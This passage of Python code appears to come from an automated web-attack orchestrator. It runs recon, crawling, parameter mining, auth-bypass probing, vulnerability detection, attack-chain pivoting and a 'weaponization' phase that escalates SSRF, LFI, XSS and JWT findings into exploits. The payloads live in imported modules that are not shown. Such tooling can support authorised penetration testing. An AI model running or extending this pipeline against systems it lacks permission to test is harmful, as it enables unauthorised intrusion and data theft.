                    from tools import ssrf_pwn as ssrf_lateral
                    result["ssrf_lateral"] = ssrf_lateral.run(url, param, sess=raw_sess, timeout=self.timeout)
                    result["ssrf_pwn"] = ssrf_lateral.check(url, param, sess=raw_sess, timeout=self.timeout)
                except Exception as e:
                    logger.debug("ssrf weaponize: %s", e)

            if vtype == "lfi":
                v = finding.get("result", {})
                if v.get("rce_available"):
                    result["rce"] = True
                    result["exploit_ready"] = True

            if vtype == "xss":
                try:
                    from tools import xss_validator
                    result["xss_validated"] = xss_validator.check(url, param, raw_sess, self.timeout)
                except Exception as e:
                    logger.debug("xss validate: %s", e)

            if vtype == "jwt":
                tokens = finding.get("result", {}).get("tokens_found", [])
                for token_entry in tokens:
                    token_str = token_entry.get("token", "")
                    if token_str:
                        try:
                            jwt_r = jwt_exploiter.check(token=token_str, sess=raw_sess,
                                                        url=url, param=param, timeout=self.timeout)
                            result["jwt_exploit"] = jwt_r
                        except Exception as e:
                            logger.debug("jwt exploit: %s", e)
                if not result:
                    try:
                        none_token = jwt_exploiter.check(token=None, sess=raw_sess,
                                                         url=url, param=param, timeout=self.timeout)
                        result["jwt_none_test"] = none_token
                    except Exception as e:
                        logger.debug("jwt none test: %s", e)

            if result:
                return key, result
            return None, None

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures = {ex.submit(_weaponize_one, k, f): k for k, f in findings.items()}
            for future in concurrent.futures.as_completed(futures):
                try:
                    k, r = future.result()
                    if k and r:
                        exploits[k] = r
                except Exception:
                    pass

        auth_findings = auth_data.get("path_bypasses", []) + auth_data.get("cookie_bypasses", []) + auth_data.get("header_bypasses", [])
        if auth_findings:
            exploits["auth_bypass"] = {"total": len(auth_findings), "findings": auth_findings, "exploit_ready": True}

        self.state["phases"]["weaponize"] = exploits
        return exploits

    def phase_report(self) -> Dict:
        report = {
            "target": self.target,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "summary": {},
            "details": {},
        }
        detection = self.state["phases"].get("detect", {})
        findings = detection.get("findings", {})
        exploits = self.state["phases"].get("weaponize", {})
        auth_data = self.state["phases"].get("auth_bypass", {})
        recon = self.state["phases"].get("recon", {})

        by_type = {}
        for key, f in findings.items():
            vt = f["type"]
            by_type.setdefault(vt, []).append(f)

        by_url = {}
        for f in findings.values():
            u = f["url"]
            by_url.setdefault(u, []).append(f["type"])

        report["summary"]["vulnerabilities"] = len(findings)
        report["summary"]["by_type"] = {k: len(v) for k, v in by_type.items()}
        report["summary"]["by_url"] = {k: len(v) for k, v in by_url.items()}
        report["summary"]["exploit_ready"] = len(exploits)

        exploit_ready_details = []
        for k, v in exploits.items():
            if v.get("exploit_ready"):
                exploit_ready_details.append(k)
        auth_total = auth_data.get("total_bypasses", 0)
        if auth_total > 0:
            exploit_ready_details.append("auth_bypass(%d)" % auth_total)
        report["summary"]["exploit_ready_details"] = exploit_ready_details

        critical_flags = ["rce_available", "rce", "shell", "data_extracted", "credential_access", "exploit_ready"]
        report["summary"]["critical"] = any(
            any(f.get("result", {}).get(k) for k in critical_flags) for f in findings.values()
        ) or bool(exploit_ready_details)

        report["summary"]["affected_urls"] = list(by_url.keys())
        report["summary"]["param_hits"] = [
            "%s?%s [%s]" % (f["url"], f["param"], f["type"]) for f in findings.values()
        ]

        for vt, flist in by_type.items():
            report["details"][vt] = flist
        report["exploits"] = exploits
        report["auth_bypass"] = {k: v for k, v in auth_data.items() if k != "vulnerable"}

        techs = recon.get("technologies", {})
        ports = recon.get("open_ports", {})
        git = recon.get("git_leak", {})
        dirs = recon.get("directories", {})
        crawl_summary = self.state["phases"].get("crawl", {}).get("summary", {})
        mine_data = self.state["phases"].get("param_mine", {})
        total_mined = sum(len(pd.get("all_params", [])) for pd in mine_data.values() if isinstance(pd, dict))
        waf_info = self.state.get("waf", {})

        report["recon"] = {
            "technologies": [t["name"] for t in techs.get("technologies", [])],
            "open_ports": [p["port"] for p in ports.get("open_ports", [])],
            "git_exposed": git.get("git_exposed", False),
            "git_sensitive": len(git.get("sensitive_finds", [])),
            "directories": len(dirs.get("interesting", [])),
            "pages_crawled": crawl_summary.get("pages_crawled", 0),
            "endpoints": crawl_summary.get("endpoints_found", 0),
            "params_mined": total_mined,
            "test_points": detection.get("test_points", 0),
            "is_spa": crawl_summary.get("is_spa", False),
            "js_api_discovered": crawl_summary.get("js_api_discovered", 0),
            "waf": waf_info.get("name"),
            "risk_score": self.attack_plan.get("risk_score", 0) if self.attack_plan else 0,
        }

        self.state["phases"]["report"] = report
        return report

    def run(self) -> Dict:
        start = time.time()
        self.oob_server.start()

        recon_result = self.phase_recon()
        self.phase_attack_plan()
        self.phase_reason()

        print("[*] Phase 2/7: Crawling %s ..." % self.target)
        crawl_result = self.phase_crawl()
        cs = crawl_result.get("summary", {})
        spa_tag = " [SPA]" if cs.get("is_spa") else ""
        extra = ""
        if cs.get("js_api_discovered", 0):
            extra = ", %d JS API routes" % cs.get("js_api_discovered", 0)
        print("  -> %d pages, %d endpoints%s, %d params%s" % (
            cs.get("pages_crawled", 0), cs.get("endpoints_found", 0),
            extra, cs.get("unique_params", 0), spa_tag))

        if cs.get("is_spa") and PlaywrightEngine.is_available():
            print("[*] SPA detected, launching browser-based crawler ...")
            try:
                spa_result = crawl_spa(self.target)
                if spa_result.get("api_routes"):
                    print("  -> %d API routes, %d JS routes discovered via browser" % (
                        len(spa_result.get("api_routes", [])),
                        len(spa_result.get("js_api_routes", [])),
                    ))
                    crawl_result["spa_crawl"] = spa_result
                    self.state["phases"]["crawl"] = crawl_result
                    for ep in spa_result.get("api_routes", []):
                        if ep not in crawl_result.get("endpoints", {}):
                            crawl_result["endpoints"][ep] = {
                                "url": "%s%s" % (self.target, ep),
                                "methods": ["GET"], "params": [], "spa_api": True,
                            }
            except Exception as e:
                logger.debug("spa crawl: %s", e)

        print("[*] Phase 3/7: Parameter mining ...")
        mine_result = self.phase_mine(crawl_result)
        total_mined = sum(len(pd.get("all_params", [])) for pd in mine_result.values() if isinstance(pd, dict))
        print("  -> %d params discovered across %d endpoints" % (total_mined, len(mine_result)))

        print("[*] Phase 4/7: Auth bypass probing ...")
        auth_result = self.phase_auth_bypass()
        ab_total = auth_result.get("total_bypasses", 0)
        print("  -> %d bypass vectors (%d path, %d cookie, %d header, %d method)" % (
            ab_total,
            len(auth_result.get("path_bypasses", [])),
            len(auth_result.get("cookie_bypasses", [])),
            len(auth_result.get("header_bypasses", [])),
            len(auth_result.get("method_bypasses", [])),
        ))

        print("[*] Phase 5/7: Vulnerability detection (%d threads) ..." % self.threads)
        findings = self.phase_detect()
        by_type = {}
        for f in findings.values():
            by_type.setdefault(f["type"], 0)
            by_type[f["type"]] += 1
        by_type_str = " ".join("[%s:%d]" % (k.upper(), v) for k, v in sorted(by_type.items()))
        print("  -> %d vulnerabilities found: %s" % (len(findings), by_type_str))

        print("[*] Phase 6/7: Attack chain pivoting ...")
        pivot_result = self.phase_pivot()
        pivot_actions = len(pivot_result.get("pivot_actions", []))
        if pivot_actions:
            print("  -> %d chain pivot actions executed" % pivot_actions)
        else:
            print("  -> No chain pivots triggered")

        if findings or ab_total > 0:
            if self.high_priv_sess:
                print("[*] Phase 6b/7: Dual-session BOLA detection ...")
                self.phase_dual_session()
            print("[*] Phase 7/7: Weaponization (%d threads) ..." % self.threads)
            exploits = self.phase_weaponize()
            ex_ready = len([e for e in exploits.values() if e.get("exploit_ready")])
            print("  -> %d exploit paths (%d ready)" % (len(exploits), ex_ready))

        report = self.phase_report()
        self.oob_server.stop()
        report["elapsed_seconds"] = round(time.time() - start, 1)
        self.state["report"] = report
        return report


def run(target: str, sess: Optional['requests.Session'] = None,
        timeout: float = 10.0, threads: int = 10,
        high_priv_sess: Optional['requests.Session'] = None,
        fast_recon: bool = True, time_budget: Optional[float] = None) -> Dict:
    o = Orchestrator(target, sess, timeout, threads,
                     high_priv_sess=high_priv_sess, fast_recon=fast_recon,
                     time_budget=time_budget)
    return o.run()
